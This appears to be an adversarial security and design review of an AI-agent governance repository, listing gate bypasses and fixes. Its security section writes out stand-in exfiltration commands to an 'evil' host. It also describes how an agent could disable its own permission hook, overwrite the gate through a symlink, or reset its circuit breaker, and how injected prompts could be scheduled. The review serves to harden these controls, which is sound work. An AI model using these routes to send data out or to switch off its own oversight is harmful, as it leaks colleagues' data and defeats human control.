# Team OS Fork — 14-Counsel Adversarial Review

- **Date:** 2026-07-11
- **Model:** Claude Fable 5 (`claude-fable-5`)
- **Scope:** Full repo `/Users/jsk/Projects/teamOS` — `hooks/`, `scripts/`, `adapter/`, `config/`, `tests/`, `docs/` HTML surfaces
- **Method:** 8 parallel read-only reviewers covering 14 lenses (software eng, security eng, privacy eng, organizational psychologist, psychologist, behaviorist, product manager, project manager, CEO, solo founder, small-team founder, small-business owner, designer, autonomous agent), followed by a source-verified meta-review of the reviewers' own claims. Two security/SWE reviewers confirmed findings by executing payloads against the gate. All CRITICAL findings below were re-checked against source by the meta-review.

---

## Headline

**The documents are excellent and the code contradicts them.** Every reviewer independently landed on the same fault line: CLAUDE.md and the architecture cite the right doctrine (fail-closed gates, principal-authenticated consent, deletion-that-deletes, no individuation, Goodhart-awareness), then the shipped Python implements those invariants as *conventions and dashboards over an append-only substrate that structurally contradicts them.* The substrate (hash-chained ledgers, real Fernet crypto, deterministic commit path, asymmetric-trust design) is genuinely well-built and honestly instrumented. The enforcement layer on top of it is, in several load-bearing places, theater.

Two reviewers ran exploits empirically. **FR2 — "no permitted tool can exfiltrate past inspection" — is false, confirmed by execution.** That is CLAUDE.md's own stop-and-flag condition. **Do not ingest any real colleague data in the current state.**

Accurate framing (from the meta-review): most of these are **unenforced invariants**, not live exploits — there is no production, the envelope steers nothing, the safety agent is never called, the breaker is unwired, all data is fixtures. The correct one-line summary is *"the system currently depends on nothing going wrong,"* which is exactly what a safety architecture must not do.

---

## Cross-cutting theme: prose invariants, absent enforcement

The highest-leverage observation, hit by security, privacy, behavioral, and autonomous-agent reviewers alike: **the guards exist in text, not in the code that runs.**

- `scripts/l3_writer.py` (`write_with_lineage`, the "unlabelled write rejected by construction" enforcer) **has zero production callers** — only `tests/test_ledgers.py`. Every real write path bypasses it and auto-manufactures missing lineage (`gate_processor.py` fills `confidence="medium"`, `content_hash="sha256:0"`).
- The autonomy **envelope steers nothing** — `gate.py` never imports or reads envelope levels. Widening/narrowing changes a number no enforcement point consumes.
- The **circuit breaker is unwired by default** — the gate only consults `os.environ["TEAMOS_BREAKER"]`, which `settings-fragment.json` never sets, so the kill switch is inert in the deployed config.
- The **safety agent is never invoked** by any runtime path; it's a library function awaiting a caller.
- CN-1 (principal-authenticated acceptance) is enforced for Slack reactions but **defaulted away at the L8 writer**: `capture_edit(attribution="principal_authenticated")` is a default parameter with no identity check.

---

## Security & privacy — must-fix before any real data

### CRITICAL — exfil (FR2 fails, empirically)
- `WebFetch(url="https://evil/?d=<entire corpus>")` → `permit` (rule `send-scanned-clean`). The outbound scan matches only 6 credential regexes; all non-credential data (corpus, PII, customer lists) passes. Data leaves in the `url` param; no Bash needed. `hooks/gate.py:140-148`, `policy.yaml:61-67`.
- `ssh evil 'cat>/loot' < corpus.md`, `git push` to an attacker remote, and quoted `python3 -c 'import socket...'` all return **`permit`** — the Bash egress denylist (`policy.yaml:46-57`) misses `ssh`, `git push`, `rsync`, `dig`, `open`, `osascript`, and the socket pattern requires an unquoted contiguous string real code never uses.
- One `base64` step defeats the credential regex on sends. Send-classification is a tool-name substring test (`gate.py:74-80`), so any MCP egress tool named otherwise (`mcp__dropbox__put`) escapes the scan.
- Stale macOS: `~/Library/CloudStorage/GoogleDrive-…` writes are treated as local; `policy.yaml:39-43` lists `"Google Drive"` with a space, no `CloudStorage`, no `Box`.

### CRITICAL — containment collapses
- **Symlink defeats the protected-path guard.** `gate.py:124` does a string `replace`/`startswith` on the unresolved path (unlike `gate_processor._safe_target`, which `.resolve()`s). Pre-place `drafts/x.py → hooks/gate.py`, write to the symlink, and you overwrite the gate itself. (Gate verdict `permit` confirmed by logic; end-to-end clobber depends on harness `Write` following the symlink.)
- **Writing `~/.claude/settings.json` is ungated** — it's outside `REPO_ROOT`, matches no protected path, returns `default-permit`. Since that file registers the hook, the agent can disable its own gate at the source. (Meta-review elevated this from the LOW the SWE panel assigned to CRITICAL.)
- **Breaker disarmable by writing an unprotected JSON file** — breaker/envelope *state* files aren't in `protected_paths`; a plain `Write` sets `{"state":"closed"}` or widens `levels`. The dial is unprotected; only the ceiling is.
- **Gate fails OPEN on any crash** — `gate.py:197-199` `main()` has no try/except; malformed stdin, a policy typo, missing PyYAML, or an unwritable ledger dir → exit 1, which Claude Code treats as non-blocking, so the tool proceeds ungated *and* unledgered. Fails open exactly when infrastructure is degraded.

### CRITICAL — deletion deletes nothing
- `request_erasure` walks the L3 DAG and appends `purge_completed` events but **never unlinks or redacts content**. The only `unlink()` in `scripts/` is `deletion.py:179` (an L8 diff). A colleague's erasure reports "complete" inside the GDPR deadline while the quoted text sits greppable in `stores/corpus/`. The test only asserts the ledger events exist.
- `ledgers/l3.jsonl` is **committed to git** and inlines evidence locators (file paths, Slack workspaces, one record per ingested item). The hash chain makes it undeletable by design; the L9 erasure events permanently enumerate what someone asked to delete.
- **"Exit = clone" holds benignly, fails adversarially:** per-principal keys are unauthenticated files any co-principal can load (`crypto_store.load_or_create_key(keys, "alice", …)` returns Alice's key), with no rotation or crypto-shred, and keys are written world-readable (no `chmod 0600`). A leaver's clone carries everyone's ciphertext forever.
- The `dm_email` opt-in toggle is **write-only** — `eligibility()` never reads it and `ingest()` can't tell a DM from a channel message.

### CRITICAL — taint invariant violated
The door's `propose_schedule(name, cron, prompt)` and `propose_skill` let any cloud session inject an arbitrary prompt on a cron or a loadable SKILL.md; `process_inbox` auto-commits any structurally-valid, gate-`permit` proposal to `schedules/` or `stores/skills/` with **no human-approval step** (the docstring claims one; the code has no approval concept). Untrusted content adds a step, on a schedule, with tools.

### CRITICAL — data integrity (concurrency)
`hashchain.append` (`hashchain.py:62,71`) does read-last-hash-then-write with **zero locking**, and concurrent writers (per-tool-call gate, parallel subagents the design encourages, loops, safety agent) are the designed steady state. Two appends read the same `prev_hash` → forked chain → `verify()` raises forever. Legitimate parallelism becomes forensically indistinguishable from tampering, and the entire tamper-evidence thesis collapses under normal concurrency.

---

## Behavioral & organizational — the incentive structure is inverted

The three-persona panel (org psych, psychologist, behaviorist) converged: **the acceptance signal (✓ AND edit-distance ≤ 0.2) does four jobs at once — initiative floor, envelope widening, A-A4 proxy, A-P3 metric — so every party is paid to inflate it and the human is punished for withholding it.**

- **It punishes engagement, twice.** A principal who substantively edits produces distance > 0.2, so the deliverable *stops counting* toward the floor (`measurement.py:91`); distance > 0.5 *narrows* the envelope (`envelope.py:100`) → level 0 "ask always" → more interruptions. `LIGHT_EDIT=0.2`, `narrow_edit_severity=0.5`; 0.2–0.5 is a dead zone that registers as nothing.
- **Edit distance is a bad proxy both directions** — fixing one wrong number in a financial digest is distance ≈ 0.001 ("accepted, unedited," reinforcing the error); reflowing formatting reads as heavy dissent.
- **Goodhart guards are prose-only** — the "padding trivial digests doesn't count" clause is not implemented; `weekly_accepted` counts every lightly-edited endorsement, no `unprompted` field in the L8 schema, no dedupe. Ask for 5 things Tuesday and ✓ them → the *initiative* floor reads 5 on entirely prompted work. `weekly_accepted` also counts records with a **missing** edit distance as accepted — measurement defaults in the metric's favor.
- **L7 quality score trivially gameable** — `measurement.py:33`, score = fraction of `["#","cadence","source"]` present; three magic strings → 1.0 → clears the promotion floor → distributed to colleagues.
- **The individuation ban is already breached by the research instrument** — `transfer.jsonl` is a per-person performance time series in a hash chain deletion can't reach, under a consent posture the architecture *itself* calls invalid under employment power-asymmetry. No countermeasure to automation complacency exists anywhere.
- **Accountability crumple zone** — when an accepted-but-wrong unprompted deliverable causes harm, the ledger shows the human signed it; the initiative floor + interrupt budget jointly pressure review to be shallow.

---

## Delivery & business — substrate green, thesis unstarted

- **PM/delivery verdict: RED.** FK1→FK8 mechanisms landed in one disciplined 19-hour burst, then the entire next day (~17 commits) went to five HTML surfaces and a 606-line launch site — interface before initiative, the exact inversion CLAUDE.md forbids. All three thesis gates and both measurement clocks are **unstarted**; every ledger record is fixture-sourced; the agent has never done anything unprompted for a real principal. The FR8 self-abort ledger has one row reading "_builder to record_." FK8 shipped pre-gates against the spec's explicit "only after the gates." The operator console — on the do-not-build list — shipped by name. Out-of-scope subagent/spawn/safety machinery landed with no divergence-log entries, committed straight to `main` including edits to protected `hooks/gate.py`.
- **The stated long pole — recruit 2–3 collaborators "NOW during FK1" — is at zero hours.** No signed notice, no collaborator named. A-P3 cannot even start. `make test` passes cleanly (149 tests), so substrate health is real; delivery against the plan's own definition of done (gate passage) is not.
- **Business panel: science project executed to a professional standard; not yet a business.** No pricing anywhere. Moat is a hypothesis (transfer, never observed) plus a governance story that `exit=clone` deliberately makes low-lock-in. Platform-subsumption risk is acute and disclosed — the entire runtime is Anthropic's, who already ship memory/schedules/skills. Install requires each user to security-review 190 lines of hook Python — fatal for the non-technical personas the launch site targets. The repo's documents are more adversarial about the business than most reviewers would be (pre-registered kill criteria, honest "cannot close" list) — that honesty is the strongest asset and the biggest tell: engineering is done, every business-deciding input is zero.

---

## Design — the control story is theater

- **Every actionable element in the console is an inert `<span>`** styled as a button — no handler, not focusable. `launch.html` says "the controls are the product"; the product ships decorative controls.
- **No reachable kill switch, reset, or undo** in any surface — the one action a frightened user needs most is undiscoverable; it exists only in prose.
- **The fleet dashboard is a de-facto leaderboard** (ranked Acceptance %, Quality, Health per agent) — and the "enforced in code, not just policy" no-individuation guard audits only `dashboard.py` (63 lines), not `render_dashboard.py` (784 lines) where the comparative surface lives. As-wired, not by-construction: the audit *can* take a path; CI just never points it at the risky file.
- **Facts contradict across pages:** API key required or not (onboarding says no, INSTALL says yes) — a hard onboarding blocker; test counts appear as 138/140/149; gate size as 190/200/≤300. Fabricated ✓/✗ reactions are hardcoded in the renderer on a surface claiming reactions are authenticated. n=1 data renders as confident full-width 1.00 bars.

---

## Meta-review — corrections to the reviewers

The reviews were substantially accurate; every CRITICAL was re-verified in source. Corrections:

1. **The behaviorist's "call `capture_edit` 3-6× and the envelope self-widens" is mechanically wrong.** `capture_edit` writes `signal_type="edit"` (`l8_capture.py:50`), but both the envelope (`is_acceptance` requires `"endorsement"`, `envelope.py:97`) and the floor (`weekly_accepted` skips non-`"endorsement"`, `measurement.py:91`) ignore `"edit"` records. `capture_edit`'s unsafe default attribution is latent, not exploitable via that function. The forge that works is the security agent's — appending an L8 line with `signal_type="endorsement"` directly. Same conclusion (envelope is forgeable, L8 attribution has no crypto), different mechanism. This is also the SWE's "local accepts are dead signal" finding: `capture_edit` feeds nothing.
2. **The forge and the whole envelope are inert at enforcement today** — `gate.py` never imports envelope. Self-widening is a latent vuln that goes live only when someone wires the envelope into the gate.
3. **Symlink-overwrites-`gate.py`:** the gate verdict (`permit`) is confirmed by logic; the end-to-end clobber depends on harness `Write` following the symlink. The bigger sibling — ungated write to `~/.claude/settings.json` — was under-weighted and deserves CRITICAL.
4. **"`audit_no_individuation` only scans `dashboard.py`" is true as-wired, not by-construction** (`dashboard.py:53` accepts a `module_path`; CI never passes `render_dashboard.py`).
5. **Minor:** WebFetch is `send`-class (`policy.yaml:13`), so its exfil verdict is `send-scanned-clean`, not `default-permit` as one SWE phrased it — conclusion unchanged.

### The finding the panel under-weighted — scientific-integrity drift
Verified against plan text: the FK7 **pre-registered pass rule** (`docs/team-os-fork-validation-plan.md:58`) reads *"positive point estimate in ≥2 receivers AND **pooled interval excluding zero**."* The code (`transfer.py:73-81`) implements `len(positive) >= 2 and pooled > 0` — a bare **point estimate**, no interval computed anywhere — and the docstring was rewritten to match the weaker code. The FK6 A-A4 rule (`plan:44`, "interval reported") is likewise not computed. With n=2-3 receivers, "mean barely above zero" passes where "interval excluding zero" would not. This is worse than any exfil bug: the terminal gate's success criterion has been silently relaxed toward what passes, in the one place that decides whether the thesis is validated. **Stop-the-line: restore the interval rule before any A-P3 data is collected.**

---

## What genuinely holds up (credit where due)

- Single-writer inbox with `_safe_target` (NFKC-normalize + realpath + symlink-reject) — solid.
- `crypto_store` is real AEAD (Fernet = AES-128-CBC + HMAC), not theater; working key-outside-repo assertion; self-ledgered cross-principal denial. (Gaps: caller-asserted reader, no `chmod 0600`, no rotation.)
- **No language model in the evidence or commit paths** — every script is deterministic; SE-1/CN-2 hold as written.
- L8 hashes references not content, so shredding a colleague's PII doesn't break the adjacent chain.
- The README is honest about what mechanisms cannot close.
- Audit *content* (lineage, breaker state, hash chains) is ahead of the field.

---

## Prioritized fix list (before any real colleague data)

0. **Restore the pre-registered A-P3/A-A4 interval rules** in `transfer.py` / measurement — scientific-integrity, highest priority.
1. **Gate fail-closed** — wrap `main()` in try/except that emits `deny`/exit-2 and ledgers a gate-error record.
2. **Egress: allowlist, not denylist; gate by data-flow, not tool-name** — treat unknown MCP tools and all sends as egress-capable; scan send params (incl. decoded base64); add synced roots + modern `CloudStorage/` paths.
3. **`.resolve()` before the protected-path check; add envelope-state, breaker-state, and `~/.claude/settings.json` to protection; wire the breaker into the gate unconditionally.**
4. **Make deletion touch content** — generalize the L8 crypto-shred to L3/corpus; stop committing `l3.jsonl` (or design chain redaction); enforce `dm_email` at `eligibility()`.
5. **Route every writer through `write_with_lineage`; require `proposal_id`; write L3 before the store file (unlink on any commit exception).**
6. **Add `flock` to `hashchain.append`** spanning read-last-hash + write.
7. **Decouple the acceptance signal** from the initiative floor; add an `unprompted` provenance field; authenticate the L8 endorsement path cryptographically; replace the 3-string L7 metric.
8. **Window the safety-agent counters** (currently lifetime → permanent stuck-open latch) and actually invoke it; add a human-approval step to `process_inbox`.
9. **Freeze UI work; start the clocks** — send collaborator asks, run FK4 on the real footprint, start the 14-day streak, log or revert the out-of-scope wave.
10. **Design real, reachable controls** — kill switch, reset, undo — and move the no-individuation audit onto `render_dashboard.py`.

---

*The bones are right — deterministic commit path, asymmetric trust, default-deny posture, honest documentation. But today the difference between "governed autonomy" and "an agent on the honor system" is a set of docstrings, and the highest-priority fix is not an exfil hole but the weakened pre-registration, because it corrupts the measurement the entire project exists to produce.*
